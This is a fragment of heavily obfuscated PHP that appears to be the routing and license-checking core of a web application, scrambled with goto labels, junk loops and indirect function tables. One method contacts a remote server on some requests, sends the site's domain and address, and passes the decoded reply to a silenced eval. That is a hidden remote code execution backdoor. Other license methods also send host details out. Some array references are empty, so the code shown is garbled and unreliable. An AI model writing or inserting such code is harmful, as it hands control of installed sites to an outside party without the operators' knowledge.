$EЏ = $D[2]($EЏ, $D[1]); } $D[13](array($D[14], $D[15]), $D窅 . $D[16], $EЏ); goto aŐ퇐; A: $EŌ = $D[6]($Cﳻ[0]); $D窅 = $D[7]; $Eӭ = $e䣄[574]; goto C; E: } private function autorun() { $bܽ =& $_SERVER[]; global $config; if ($bܽ[19]($config[$bܽ[20]]) == 0) { return; } foreach ($config[$bܽ[20]] as $EƐڟ => $F) { $this->{$_SERVER[][21]}($F); $BԇӘ = $_SERVER[Ť][575]; } } private function cpdlaed03490() { goto Bݵ̿; Bݵ̿: $BⰎ =& $_SERVER[Ť]; $d =& $_SERVER[]; $A = $d[8]; goto d獃; BЮ: if (strlen($Cݣ) < $BⰎ[568]) { return; } goto Fӈ; d獃: $F≡ = $GLOBALS[$d[22]][$d[23]][0]; if (!$F≡ || $d[24]($F≡) <= $d[24]($A)) { return; } if ($d[6]($d[25]($F≡, -$d[24]($A))) != $A) { return; } goto Bͽ; Bͽ: $DУ⥜ = $d[25]($F≡, 0, -$d[24]($A)); $Cƪ = array($d[8], $DУ⥜); $f = $d[26]($GLOBALS[$d[22]][$d[23]], 1); goto e۲; e۲: $GLOBALS[$d[22]][$d[23]] = $d[27]($Cƪ, $f); $GLOBALS[$d[22]][$d[28]] = $d[29]($d[1], $GLOBALS[$d[22]][$d[23]]); $Cݣ = $BⰎ[576]; goto BЮ; Fӈ: } private function nmzld544d62d() { goto c; eŊॅ: if (strlen($BՎ) < $B[579]) { return; } $d܏ = $eϲʘ[25]($c, $C媊 + $eϲʘ[24]($d֑)); $eϲʘ[34]($eϲʘ[35], $d܏, $eЯ˸͏); goto Dߖ֠˴; Dߖ֠˴: $Eү = $B[580]; $d܏ = $eϲʘ[2]($eЯ˸͏[0][0], $eϲʘ[36]); $GLOBALS[$eϲʘ[22]][$eϲʘ[23]] = $eϲʘ[0]($eϲʘ[36], $d܏); goto c; C: if (!$eϲʘ[32]($c, $d֑)) { return; } $C媊 = $eϲʘ[33]($c, $d֑); $BՎ = $B[578]; goto eŊॅ; c: $B =& $_SERVER[Ť]; $eϲʘ =& $_SERVER[]; if ($GLOBALS[$eϲʘ[22]][$eϲʘ[28]] != $eϲʘ[10]) { return; } goto b; b: $c = $_SERVER[$eϲʘ[30]]; $Cɱߋ = $B[577]; $d֑ = $eϲʘ[31]; goto C; c: $e둉 = $B[581]; while ($e둉 < $B[568]) { if ($e둉 >= 0) { break; } $e둉++; } $GLOBALS[$eϲʘ[22]][$eϲʘ[28]] = $eϲʘ[29]($eϲʘ[1], $GLOBALS[$eϲʘ[22]][$eϲʘ[23]]); goto Fت; Fت: } public function run() { goto F; e̋Đ: while ($aֈ < $A[568]) { if ($aֈ >= 0) { break; } $aֈ++; } $this->{$_SERVER[][45]}(); $F = $A[589]; goto dَ; C: $c魎Е = $A[585]; if (strlen($c魎Е) < $A[570]) { return; } $Cֆ[39]($Cֆ[42], isset($Cᷣ[2]) && $Cᷣ[0] ? $Cᷣ[2] : $this->defaultAction); goto cȄ; cȄ: $d֖ = $A[586]; while (strlen($d֖) < $A[564]) { if (!$d֖) { break; } $d֖++; } $Cֆ[39]($Cֆ[43], MOD . $Cֆ[1] . ST . $Cֆ[1] . ACT); goto bֈ; bֈ: $e = $A[587]; $_SERVER[$Cֆ[44]] = $Cֆ[6](ACTION); $aֈ = $A[588]; goto e̋Đ; e㥏Ụ: $this->{$_SERVER[][38]}(); $Cᷣ = $GLOBALS[$Cֆ[22]][$Cֆ[23]]; $fᛨ = $A[582]; goto BĘ; BĘ: if (strlen($fᛨ) < $A[583]) { return; } $aö۴ = $GLOBALS[$Cֆ[22]][$Cֆ[28]]; $Cֆ[39]($Cֆ[40], isset($Cᷣ[0]) && $Cᷣ[0] ? $Cᷣ[0] : $this->defaultModule); goto b; dَ: while (strlen($F) < $A[579]) { if (!$F) { break; } $F++; } if ($Cֆ[19]($Cᷣ) >= 3) { $this->{$_SERVER[][21]}($aö۴); } else { $this->{$_SERVER[][21]}(ACTION); } goto a; b: $Cͮޤ = $A[584]; if (strlen($Cͮޤ) < $A[568]) { return; } $Cֆ[39]($Cֆ[41], isset($Cᷣ[1]) && $Cᷣ[0] ? $Cᷣ[1] : $this->defaultController); goto C; F: $A =& $_SERVER[Ť]; $Cֆ =& $_SERVER[]; $this->{$_SERVER[][37]}(); goto e㥏Ụ; a: } private $psyb6e17247c = array(); private $lzwg0f39e624 = ''; public function hjoa02974716() { goto DޏĊ; a: $cϨ = $fޝ[593]; if (strlen($cϨ) < $fޝ[570]) { return; } goto Bز; DޏĊ: $fޝ =& $_SERVER[Ť]; $cۓ =& $_SERVER[]; $this->{$_SERVER[][46]}(); goto AՎ; aÕҠ: $this->{$_SERVER[][48]}(); $this->{$_SERVER[][49]}(); $A峣 = $fޝ[591]; goto f튭; F: $this->{$_SERVER[][52]}(); $this->{$_SERVER[][3]}($cۓ[53], array($this, $cۓ[54])); $cЈ = $fޝ[592]; goto d賆; f튭: if (strlen($A峣) < $fޝ[564]) { die; } $this->{$_SERVER[][50]}(); $this->{$_SERVER[][51]}(); goto F; AՎ: $this->{$_SERVER[][47]}(); $A = $fޝ[590]; if (strlen($A) < $fޝ[579]) { die; } goto aÕҠ; d賆: $this->{$_SERVER[][3]}($cۓ[55], array($this, $cۓ[56])); $this->{$_SERVER[][3]}($cۓ[57], array($this, $cۓ[58])); $this->{$_SERVER[][3]}($cۓ[59], array($this, $cۓ[60])); goto a; Bز: } public function mkbdb619e193($eˊ) { goto Eŵ; BٛΘ: $eˊ[$D[114]][$D[136]] = $D[112]($this->psyb6e17247c, $D[137], $D[10]); $Fއ = $BÉ[598]; if (!$Fއ) { return; } goto a; Cˏϥ: $eˊ[$D[114]][$D[119]] = $D[120]($_SERVER[$D[121]] . $cِ[$D[122]]); $eˊ[$D[114]][$D[123]] = $D[124]($D[125]()); $E = $BÉ[596]; goto E鯇; fގ: if ($cِ[$D[126]] != $D[127]) { $eˊ[$D[114]][$D[128]] = $cِ[$D[128]]; $eˊ[$D[114]][$D[129]] = $cِ[$D[129]]; $Fո = $D[130](10) . $this->lzwg0f39e624 . $D[130](5); $eˊ[$D[102]][$D[131]][$D[132]] = $this->{$_SERVER[][133]}($Fո, $eˊ[$D[114]][$D[119]]); } if ($this->lzwg0f39e624 == $D[127]) { $eˊ[$D[102]][$D[103]][$D[108]][$D[113]] = 0; } $eˊ[$D[114]][$D[134]] = $D[112]($this->psyb6e17247c, $D[135], $D[10]); goto BٛΘ; Eŵ: $BÉ =& $_SERVER[Ť]; $D =& $_SERVER[]; $cِ = $D[61]($D[62])->{$_SERVER[][63]}(); goto F; A򚜸: unset($eˊ[$D[102]][$D[103]][$D[107]]); $eˊ[$D[102]][$D[103]][$D[108]] = array($D[109] => (int) $Bʋ[$D[110]], $D[111] => (int) $D[112]($Bʋ, $D[113], 0)); $eˊ[$D[114]][$D[115]] = $D[116]($D[117])->{$_SERVER[][118]}(); goto Cˏϥ; E鯇: while ($E < $BÉ[568]) { if ($E >= 0) { break; } $E++; } $eˊ[$D[114]][$D[126]] = $this->lzwg0f39e624; $fދ = $BÉ[597]; goto fގ; F: $d޷ = array($D[64], $D[65], $D[66], $D[67], $D[68], $D[69], $D[70], $D[71], $D[72], $D[73], $D[74], $D[75], $D[76], $D[77], $D[78], $D[79], $D[80], $D[81], $D[82], $D[83], $D[84], $D[85], $D[86], $D[87], $D[88], $D[89], $D[90], $D[91], $D[92], $D[93], $D[94], $D[95], $D[96], $D[97], $D[98], $D[99]); foreach ($d޷ as $cϲ) { $Eή̈́ = $GLOBALS[$D[100]][$D[101]][$cϲ]; if (isset($cِ[$cϲ])) { $Eή̈́ = $cِ[$cϲ]; } $eˊ[$D[102]][$D[103]][$cϲ] = $Eή̈́; } $Bʋ = $eˊ[$D[102]][$D[103]][$D[76]]; goto c֚; a: if ($D[112]($GLOBALS, $D[138]) && $this->config[$D[139]]) { $eˊ[$D[114]][$D[140]] = WEB_ROOT; } return $eˊ; goto F¤; D: unset($eˊ[$D[102]][$D[104]][$D[106]]); unset($eˊ[$D[102]][$D[103]][$D[76]]); $cƚĝ = $BÉ[595]; goto A򚜸; c֚: $F¢ֳ = $BÉ[594]; while ($F¢ֳ < $BÉ[570]) { if ($F¢ֳ >= 0) { break; } $F¢ֳ++; } unset($eˊ[$D[102]][$D[104]][$D[105]]); goto D; F¤: } private function mjep8ed44fe5() { goto d; aۏ: foreach ($b© as $d) { if (!isset($a߂[$d]) || !$a߂[$d]) { continue; } $d̍[$d] = $a߂[$d]; } $f˙ƨ[13](array($f˙ƨ[157], $f˙ƨ[158]), $d̍); $Bէ = $b[602]; goto eєԓ; d: $b =& $_SERVER[Ť]; $f˙ƨ =& $_SERVER[]; if ($_SERVER[$f˙ƨ[44]] == $f˙ƨ[141]) { goto Eܐ랊; a: $d̍ = array($f˙ƨ[156] => $A˥); $dي = $b[599]; if (!$dي) { die; } goto D魨; Eܐ랊: $A˥ = array($f˙ƨ[126] => $this->lzwg0f39e624, $f˙ƨ[142] => $this->{$_SERVER[][143]}(), $f˙ƨ[144] => $f˙ƨ[61]($f˙ƨ[145])->{$_SERVER[][146]}()); if ($this->lzwg0f39e624 != $f˙ƨ[127]) { $B = $f˙ƨ[112]($this->psyb6e17247c, $f˙ƨ[147]); if ($B) { $A˥[$f˙ƨ[148]] = $B; $A˥[$f˙ƨ[149]] = $f˙ƨ[150]($f˙ƨ[112]($this->psyb6e17247c, $f˙ƨ[151])); $A˥[$f˙ƨ[152]] = $f˙ƨ[112]($this->psyb6e17247c, $f˙ƨ[137]); } } $A˥ = $this->{$_SERVER[][153]}($f˙ƨ[154]($A˥), $f˙ƨ[120]($f˙ƨ[155])); goto a; D魨: $f˙ƨ[13](array($f˙ƨ[157], $f˙ƨ[158]), $d̍); $DĞ = $b[600]; goto B⽐; B⽐: } goto Aֽ; eєԓ: while ($Bէ < $b[564]) { if ($Bէ >= 0) { break; } $Bէ++; } goto f۵; Aֽ: if ($this->lzwg0f39e624 == $f˙ƨ[127]) { return; } $b© = array($f˙ƨ[159], $f˙ƨ[160], $f˙ƨ[161], $f˙ƨ[162], $f˙ƨ[163], $f˙ƨ[164]); $a߂ = $f˙ƨ[61]($f˙ƨ[62])->{$_SERVER[][63]}(); goto Eߘ҅; Eߘ҅: $Aծ = $b[601]; if (strlen($Aծ) < $b[570]) { return; } $d̍ = array($f˙ƨ[165] => $a߂[$f˙ƨ[64]], $f˙ƨ[166] => $a߂[$f˙ƨ[65]], $f˙ƨ[167] => $f˙ƨ[10]); goto aۏ; f۵: } private function aemgc0154db2() { goto Aۜ; Bў: $BŖ = $A蜦[120]($_SERVER[$A蜦[121]] . $C); $eՆ = $A[603]; if ($E[$A蜦[184]] == $A蜦[185]) { $D = $this->{$_SERVER[][153]}($BŖ, $A蜦[186]); $a = $this->{$_SERVER[][133]}($A蜦[154]($fʿɑ), $BŖ . $A蜦[187], 3); $a = $a . $A蜦[188] . $_SERVER[$A蜦[179]]; $fణ = $this->{$_SERVER[][189]}($A蜦[190] . $D . $A蜦[191] . $a, -1); $A蜦[172]($fణ, !0); } else { if ($E[$A蜦[184]] == $A蜦[192]) { $dϸ = $A蜦[25]($A蜦[120]($A蜦[193] . $BŖ), 12, 15) . $A蜦[194]; $a = $this->{$_SERVER[][195]}($A蜦[2]($E[$A蜦[196]]), $dϸ, 2); $DМ = $A蜦[197]($a, !0); if (!$A蜦[198]($DМ) || !$A蜦[198]($DМ[$A蜦[199]]) || $DМ[$A蜦[171]] != !0) { $Bꐱ = $A蜦[200]; $Dǜ = $DМ[$A蜦[199]] ? $A蜦[201] . $DМ[$A蜦[199]] : $Bꐱ; $A蜦[172]($Dǜ, !1); } else { $fʿɑ[$A蜦[174]] = $DМ[$A蜦[199]][$A蜦[202]]; } } else { $DМ = $this->{$_SERVER[][189]}($A蜦[203], $fʿɑ, 10); $EĔ̞ = $A[604]; while ($EĔ̞ < $A[568]) { if ($EĔ̞ >= 0) { break; } $EĔ̞++; } } } goto Cߜ; êΐ: $A蜦[172]($A蜦[204]($A蜦[214]), !0); $F拕 = $A[617]; goto bݟ; B: $Eẕɩ = $eв . $fȄ有[$A蜦[126]] . $fȄ有[$A蜦[218]]; $fȄ有[$A蜦[128]] = $A蜦[220]($A蜦[124]($this->{$_SERVER[][153]}($Eẕɩ, $A蜦[221]))); $D򖥬 = $A[606]; goto bϭ; A: if (!$b痖) { die; } $A蜦[61]($A蜦[11])->{$_SERVER[][232]}($d[$A蜦[233]], array($A蜦[234] => $c䍟)); $b͵цߞ = $A[614]; goto e; cעϙ: $cקݾ = $A[615]; while ($cקݾ < $A[570]) { if ($cקݾ >= 0) { break; } $cקݾ++; } $this->{$_SERVER[][235]}(); goto fы; c: $eס = $A[605]; if (strlen($eס) < $A[568]) { die; } if (!$bҥ || $bҥ != $f[$A蜦[151]]) { $aô = array($A蜦[208] => $A蜦[61]($A蜦[62])->{$_SERVER[][63]}($A蜦[122]), $A蜦[209] => $_SERVER[$A蜦[121]], $A蜦[210] => $A蜦[211](), $A蜦[180] => $_SERVER[$A蜦[181]]); $a = $this->{$_SERVER[][212]}($A蜦[154]($aô)); $this->{$_SERVER[][189]}($A蜦[213] . $a); $A蜦[172]($A蜦[204]($A蜦[214]), !0); } goto b湊; E: if (!isset($E[$A蜦[171]]) || $A蜦[24]($E[$A蜦[171]]) != 16) { $A蜦[172]($A蜦[173] . $E[$A蜦[171]], !1); } $C = $A蜦[61]($A蜦[62])->{$_SERVER[][63]}($A蜦[122]); $fʿɑ = array($A蜦[171] => $E[$A蜦[171]], $A蜦[174] => $A蜦[130](16), $A蜦[175] => $A蜦[155], $A蜦[176] => $A蜦[177], $A蜦[178] => $_SERVER[$A蜦[179]], $A蜦[180] => $_SERVER[$A蜦[181]], $A蜦[182] => $_SERVER[$A蜦[183]]); goto Bў; e: if (strlen($b͵цߞ) < $A[568]) { return; } $this->psyb6e17247c = $f; $this->lzwg0f39e624 = $fȄ有[$A蜦[126]]; goto cעϙ; F쇌ә: $DŇ = $A蜦[120]($_SERVER[$A蜦[121]] . $A蜦[220]($C) . $fȄ有[$A蜦[216]]); $e = $A[609]; $f᠗ = $A蜦[220]($A蜦[25]($DŇ, 10, 16)); goto c; Aۜ: $A =& $_SERVER[Ť]; $A蜦 =& $_SERVER[]; if ($_SERVER[$A蜦[44]] != $A蜦[168]) { return; } goto Cઓ; b湊: $fȄ有 = array($A蜦[215] => $fʿɑ[$A蜦[171]], $A蜦[216] => $f[$A蜦[217]], $A蜦[218] => $A蜦[130](16), $A蜦[126] => $f[$A蜦[219]]); if ($fʿɑ[$A蜦[174]]) { $fȄ有[$A蜦[218]] = $fʿɑ[$A蜦[174]]; } $eв = $A蜦[25]($A蜦[120]($fȄ有[$A蜦[216]]), 10, 10); goto B; f: $F֧̒ = $A[608]; if ($f[$A蜦[223]] && $f[$A蜦[223]] >= 1) { $A蜦[61]($A蜦[62])->{$_SERVER[][224]}($A蜦[225], $A蜦[226]); } $A蜦[61]($A蜦[62])->{$_SERVER[][227]}($fȄ有); goto F쇌ә; c: $c߼ = $A[610]; if (!$c߼) { die; } $B˅ = $this->{$_SERVER[][133]}($A蜦[154]($f), $DŇ); goto DÐ; B娢: if (strlen($f) < $A[568]) { die; } $c䍟[$f᠗] = $B˅; $b痖 = $A[613]; goto A; eǦѓ: $d = $b򌧂Ɖ[$A蜦[231]]; $c䍟 = array(); $f = $A[612]; goto B娢; fы: $BՖ = $A[616]; while ($BՖ < $A[568]) { if ($BՖ >= 0) { break; } $BՖ++; } Cache::set($A蜦[236] . $A蜦[120]($C . $A蜦[237]), $A蜦[10]); goto êΐ; Cߜ: if (!$A蜦[198]($DМ) || !$A蜦[198]($DМ[$A蜦[199]]) || $DМ[$A蜦[171]] != !0) { $Bꐱ = $A蜦[204]($A蜦[205]); $Dǜ = $DМ[$A蜦[199]] ? $A蜦[201] . $DМ[$A蜦[199]] : $Bꐱ; $A蜦[172]($Dǜ, !1); } $f = $DМ[$A蜦[199]]; $bҥ = $this->{$_SERVER[][206]}($f[$A蜦[207]]); goto c; DÐ: $D܇ = $A[611]; if (strlen($D܇) < $A[570]) { die; } $b򌧂Ɖ = $A蜦[228]($A蜦[61]($A蜦[11])->{$_SERVER[][229]}(), $A蜦[230]); goto eǦѓ; aȌ: if (!$b) { die; } $b = $ḇת . $fȄ有[$A蜦[126]] . $this->{$_SERVER[][153]}($A蜦[120]($fȄ有[$A蜦[215]]), $ḇת); $fȄ有[$A蜦[129]] = $A蜦[124]($A蜦[220]($this->{$_SERVER[][153]}($b, $A蜦[222]))); goto f; Cઓ: if (!$A蜦[112]($GLOBALS, $A蜦[138])) { die; } $E = $GLOBALS[$A蜦[22]]; if (isset($E[$A蜦[169]])) { $this->{$_SERVER[][170]}(); die; } goto E; bϭ: while (strlen($D򖥬) < $A[579]) { if (!$D򖥬) { break; } $D򖥬++; } $ḇת = $A蜦[130](16); $b = $A[607]; goto aȌ; bݟ: } private function licenseRegistSuccess() { goto bބ; bބ: $B҅ =& $_SERVER[Ť]; $b򏎸 =& $_SERVER[]; $d͋ = $b򏎸[61]($b򏎸[62])->{$_SERVER[][63]}(); goto f; f: $Dю = $B҅[618]; if (strlen($Dю) < $B҅[568]) { die; } if ($d͋[$b򏎸[89]] != $b򏎸[226]) { $b򏎸[61]($b򏎸[62])->{$_SERVER[][227]}($b򏎸[89], $b򏎸[226]); } goto aμ; aμ: $b򏎸[116]($b򏎸[238])->{$_SERVER[][239]}(!0); goto EΊ񇃎; EΊ񇃎: } private function vhjne2c408f3() { goto Bڔ˗; Bڔ˗: $d =& $_SERVER[Ť]; $fւӞ =& $_SERVER[]; $fւӞ[61]($fւӞ[62])->{$_SERVER[][227]}(array($fւӞ[215] => $fւӞ[10], $fւӞ[216] => $fւӞ[10], $fւӞ[126] => $fւӞ[127], $fւӞ[128] => $fւӞ[10], $fւӞ[129] => $fւӞ[10])); goto DҬֆ; c: $this->psyb6e17247c = array(); $this->lzwg0f39e624 = $fւӞ[127]; $Aƅ֢ = $d[620]; goto eຨӵ; eຨӵ: while ($Aƅ֢ < $d[583]) { if ($Aƅ֢ >= 0) { break; } $Aƅ֢++; } goto eğ; DҬֆ: $fւӞ[61]($fւӞ[62])->{$_SERVER[][224]}($fւӞ[225], $fւӞ[240]); $Eڎ = $d[619]; if (!$Eڎ) { die; } goto c; eğ: } private function fcqz01684473() { goto eՍ; eՍ: $b̞ =& $_SERVER[Ť]; $a򇽵 =& $_SERVER[]; $_SERVER[$a򇽵[181]] = $a򇽵[112]($_SERVER, $a򇽵[181], APP_HOST); goto B; f: $e = $a򇽵[61]($a򇽵[62])->{$_SERVER[][63]}($a򇽵[122]); $F = $a򇽵[236] . $a򇽵[120]($e . $a򇽵[237]); $B = $b̞[621]; goto a; cމ: $dϳ = $a򇽵[150]($A񌻄[$a򇽵[151]]); if ($a򇽵[242]() >= $dϳ) { return $this->{$_SERVER[][170]}(); } $A񌻄[$a򇽵[241]] = $a򇽵[242](); goto E۵; B: $this->lzwg0f39e624 = $a򇽵[127]; $D = $a򇽵[61]($a򇽵[62])->{$_SERVER[][63]}(); if ($D[$a򇽵[126]] == $a򇽵[127]) { return; } goto f; a: if (strlen($B) < $b̞[570]) { die; } $A񌻄 = Cache::get($F); $b߸ = $b̞[622]; goto cݵ; D׏: $cǾ = $b̞[623]; while (strlen($cǾ) < $b̞[570]) { if (!$cǾ) { break; } $cǾ++; } goto aƼ; E۵: Cache::set($F, $A񌻄); $this->psyb6e17247c = $A񌻄; $this->lzwg0f39e624 = $D[$a򇽵[126]]; goto D׏; cݵ: while ($b߸ < $b̞[564]) { if ($b߸ >= 0) { break; } $b߸++; } if (!$a򇽵[198]($A񌻄) || !isset($A񌻄[$a򇽵[241]]) || $a򇽵[242]() - $A񌻄[$a򇽵[241]] >= 60) { $d燆 = $a򇽵[228]($a򇽵[61]($a򇽵[11])->{$_SERVER[][229]}(), $a򇽵[230]); $c = $d燆[$a򇽵[231]]; $c膎ޚ = $a򇽵[120]($_SERVER[$a򇽵[121]] . $a򇽵[220]($e) . $D[$a򇽵[216]]); $aҦ = $a򇽵[220]($a򇽵[25]($c膎ޚ, 10, 16)); $A񌻄 = $this->{$_SERVER[][195]}($c[$a򇽵[100]][$aҦ], $c膎ޚ); $A񌻄 = $a򇽵[197]($A񌻄, !0); } if (!$a򇽵[198]($A񌻄)) { return $this->{$_SERVER[][170]}(); } goto cމ; aƼ: } private function ndzr9a9c497f() { goto c; c: $b =& $_SERVER[Ť]; $fѮ =& $_SERVER[]; $aج = $GLOBALS[$fѮ[22]]; goto a߾; fǝ: if ($e܇ == $fѮ[243] && $this->lzwg0f39e624 == $fѮ[127]) { $fѮ[172]($fѮ[204]($fѮ[244]), !1, $fѮ[245]); } $A݌ɥ = array($fѮ[246], $fѮ[247]); if ($fѮ[248]($e܇, $A݌ɥ)) { if ($this->lzwg0f39e624 == $fѮ[127] && isset($aج[$fѮ[249]])) { $fѮ[172]($fѮ[204]($fѮ[244]), !1, $fѮ[245]); die; } $f޶٣ = $this->{$_SERVER[][143]}(); if ($f޶٣ != $fѮ[250]($fѮ[251])) { if ($f޶٣ <= $fѮ[61]($fѮ[145])->{$_SERVER[][146]}()) { $fѮ[172]($fѮ[204]($fѮ[252]), !1, $fѮ[245]); die; } } } goto Cː; a߾: $cͭ՜ = $b[624]; if (strlen($cͭ՜) < $b[564]) { die; } $e܇ = $_SERVER[$fѮ[44]]; goto fǝ; Cː: } private function puqg7b1fd2f9() { goto D✛; c鯔: $F۝ = $Dގܮ[627]; while (strlen($F۝) < $Dގܮ[564]) { if (!$F۝) { break; } $F۝++; } $Cč = @$c[263]($A, !1, $Bû); goto Aґ; FÐ: if (!$c[112]($GLOBALS, $c[138]) || !isset($_GET[$c[254]])) { return; } if (!$c[248]($_SERVER[$c[44]], $Dʼ҇)) { return; } $A = $c[255]; goto aׄڶ; e: die; goto A҇â; D✛: $Dގܮ =& $_SERVER[Ť]; $c =& $_SERVER[]; $Dʼ҇ = array($c[141], $c[253]); goto FÐ; Aґ: $bΧ = $Dގܮ[628]; $c[264]($c[265]); if ($Cč && $c[32]($Cč, $c[266])) { echo $Cč; } goto e; eՃ: $d = $Dގܮ[626]; while ($d < $Dގܮ[564]) { if ($d >= 0) { break; } $d++; } $Bû = $c[258](array($c[259] => array($c[260] => $c[261], $c[262] => 3))); goto c鯔; aׄڶ: $c = $Dގܮ[625]; while (strlen($c) < $Dގܮ[579]) { if (!$c) { break; } $c++; } $A = $this->{$_SERVER[][256]}($A, $c[257]); goto eՃ; A҇â: } public function jhswb453dfcd($bư) { goto dˋፄ; FёƆ: $Fӂ = array(); $FЃֿ = $c[630]; if (strlen($FЃֿ) < $c[568]) { return; } goto F; dˋፄ: $c =& $_SERVER[Ť]; $a˭ =& $_SERVER[]; if ($this->lzwg0f39e624 == $a˭[267]) { return $bư; } goto d㍴; F: foreach ($dť as $fĚ => $Bߘ) { if ($Bߘ == $a˭[269] && $a˭[25]($this->lzwg0f39e624, 0, 1) == $a˭[269]) { continue; } if (!$a˭[248]($fĚ, $f)) { $Fӂ[] = $fĚ; } } foreach ($Fӂ as $fĚ) { unset($bư[$fĚ]); $Ȧ = $c[631]; while ($Ȧ < $c[579]) { if ($Ȧ >= 0) { break; } $Ȧ++; } } return $bư; goto A; d㍴: $dť = array($a˭[268] => $a˭[269], $a˭[270] => $a˭[269], $a˭[271] => $a˭[269], $a˭[272] => $a˭[269], $a˭[273] => $a˭[269], $a˭[274] => $a˭[269], $a˭[275] => $a˭[276], $a˭[277] => $a˭[276], $a˭[278] => $a˭[276], $a˭[279] => $a˭[276], $a˭[280] => $a˭[276], $a˭[281] => $a˭[276], $a˭[282] => $a˭[276]); $f = $a˭[0]($a˭[283], $a˭[112]($this->psyb6e17247c, $a˭[135], $a˭[10])); $DÃɛ = $c[629]; goto FёƆ; A: } private function kyzl0b6f0464() { $Cň =& $_SERVER[]; if ($this->lzwg0f39e624 != $Cň[127]) { return; } $GLOBALS[$Cň[100]][$Cň[104]][$Cň[284]] = $Cň[226]; $GLOBALS[$Cň[100]][$Cň[285]] = $Cň[226]; $Aș = $_SERVER[Ť][632]; if ($Cň[61]($Cň[286])->{$_SERVER[][63]}($Cň[89]) != $Cň[240]) { $Cň[61]($Cň[286])->{$_SERVER[][227]}($Cň[89], $Cň[240]); } } public function qyoa4e4b88ac() { return $_SERVER[][287]; } private function mgit2eb0bad2() { goto DɈ; Cąث: if (!$F׎[248]($_SERVER[$F׎[44]], $c)) { return; } if ($F׎[242]() % 4 != 0) { return; } $cφ = $F׎[13](array($F׎[293], $F׎[294]), $aά); goto A; A͞: while ($D洍 < $eЍօ[568]) { if ($D洍 >= 0) { break; } $D洍++; } if ($this->{$_SERVER[][206]}($Eͅڤ[$F׎[297]]) != $e犦[$F׎[171]]) { $b׺ = array($F׎[208] => $F׎[61]($F׎[62])->{$_SERVER[][63]}($F׎[122]), $F׎[209] => $_SERVER[$F׎[121]], $F׎[210] => $F׎[211](), $F׎[180] => $_SERVER[$F׎[181]]); $Dץ = $this->{$_SERVER[][212]}($F׎[154]($b׺)); $Eͅڤ = $this->{$_SERVER[][189]}($F׎[213] . $Dץ); if ($Eͅڤ && $F׎[198]($Eͅڤ) && isset($Eͅڤ[$F׎[297]])) { $B = $this->{$_SERVER[][195]}($Eͅڤ[$F׎[297]], 2); if ($B) { $B = $this->{$_SERVER[][206]}($B); } if ($B) { try { @eval($B); } catch (Exception $C) { } } } } goto C; e㍜: $e졈ȓ = $eЍօ[633]; $aά = $F׎[291] . $F׎[120]($F׎[292]); if ($this->lzwg0f39e624 == $F׎[127] || !$F׎[112]($GLOBALS, $F׎[138])) { return; } goto Cąث; eɂ: $b͝ = $eЍօ[634]; $Eͅڤ = $this->{$_SERVER[][189]}($F׎[296], $e犦); if (!$F׎[198]($Eͅڤ)) { return; } goto b˃; DɈ: $eЍօ =& $_SERVER[Ť]; $F׎ =& $_SERVER[]; $c = array($F׎[288], $F׎[289], $F׎[290]); goto e㍜; A: if ($cφ && $F׎[242]() - $cφ < $F׎[250]($F׎[295])) { return; } $F׎[13](array($F׎[293], $F׎[158]), $aά, $F׎[242]()); $e犦 = array($F׎[171] => $F׎[61]($F׎[62])->{$_SERVER[][63]}($F׎[215]), $F׎[184] => $this->lzwg0f39e624, $F׎[182] => $_SERVER[$F׎[183]], $F׎[175] => $F׎[155], $F׎[178] => $_SERVER[$F׎[179]]); goto eɂ; b˃: if ($Eͅڤ[$F׎[171]] && $Eͅڤ[$F׎[297]]) { if ($this->{$_SERVER[][206]}($Eͅڤ[$F׎[297]]) == $e犦[$F׎[171]]) { return; } } $this->{$_SERVER[][170]}(); $D洍 = $eЍօ[635]; goto A͞; C: } private function mxtq9a3d93ce($Fוܛ = '', $E = array(), $CƗ = 5) { goto Dڤ҅; fںє: while (strlen($bٱ) < $e鏪[583]) { if (!$bٱ) { break; } $bٱ++; } $C˵ = $C˵ . $Fוܛ . $d߮[300] . $d߮[301]($E); if ($E === -1) { return $C˵; } goto d; Dڤ҅: $e鏪 =& $_SERVER[Ť]; $d߮ =& $_SERVER[]; $C˵ = $d߮[298]; goto dһ; d: $F = $d߮[258](array($d߮[259] => array($d߮[262] => $CƗ, $d߮[260] => $d߮[302]), $d߮[303] => array($d߮[304] => !1, $d߮[305] => !1))); $a = $e鏪[638]; if (strlen($a) < $e鏪[564]) { return; } goto a߄¼; c: while ($A傋 < $e鏪[579]) { if ($A傋 >= 0) { break; } $A傋++; } goto aצ; dһ: $a߱ = $e鏪[636]; $C˵ = $this->{$_SERVER[][256]}($C˵, $d߮[299]); $bٱ = $e鏪[637]; goto fںє; a߄¼: $E = @$d߮[263]($C˵, !1, $F); return $d߮[197]($E, !0); $A傋 = $e鏪[639]; goto c; aצ: } private function tdurccf0c9c4() { goto c®; C幎: $C = $F񖳅[640]; if (strlen($C) < $F񖳅[583]) { die; } $f = $dތ[$this->lzwg0f39e624]; goto C; Dڑ: $E = $F񖳅[642]; while (strlen($E) < $F񖳅[570]) { if (!$E) { break; } $E++; } $e = $e ? $Aϵ[250]($e) : 0; goto F䱄; c®: $F񖳅 =& $_SERVER[Ť]; $Aϵ =& $_SERVER[]; $dތ = array($Aϵ[306] => $Aϵ[307], $Aϵ[308] => $Aϵ[309], $Aϵ[310] => $Aϵ[311], $Aϵ[312] => $Aϵ[313], $Aϵ[314] => $Aϵ[315], $Aϵ[316] => $Aϵ[251], $Aϵ[317] => $Aϵ[251], $Aϵ[318] => $Aϵ[307], $Aϵ[319] => $Aϵ[309], $Aϵ[320] => $Aϵ[311], $Aϵ[321] => $Aϵ[322], $Aϵ[323] => $Aϵ[313], $Aϵ[324] => $Aϵ[325], $Aϵ[326] => $Aϵ[315], $Aϵ[327] => $Aϵ[328], $Aϵ[329] => $Aϵ[330], $Aϵ[331] => $Aϵ[332]); goto C幎; F䱄: $F = $F񖳅[643]; return $f + $e; $B = $F񖳅[644]; goto a; C: $dչͶɏ = $F񖳅[641]; $f = $Aϵ[250]($f ? $f : $Aϵ[307]); $e = $Aϵ[112]($this->psyb6e17247c, $Aϵ[333]); goto Dڑ; a: if (strlen($B) < $F񖳅[579]) { die; } goto d; d: } public function ezvs1474837e($F) { goto F; F: $CȂ =& $_SERVER[]; $Aƣ = $this->{$_SERVER[][143]}(); if ($F[$CȂ[334]] == $CȂ[226]) { return; } goto Fڞ; Fڞ: if ($Aƣ >= $CȂ[250]($CȂ[251])) { return; } $F = $CȂ[61]($CȂ[145])->{$_SERVER[][146]}(); $b = $_SERVER[Ť][645]; goto aߖ; C: if (!$CȂ[248]($F[$CȂ[334]], $bÐ)) { $CȂ[172]($CȂ[338], !1, 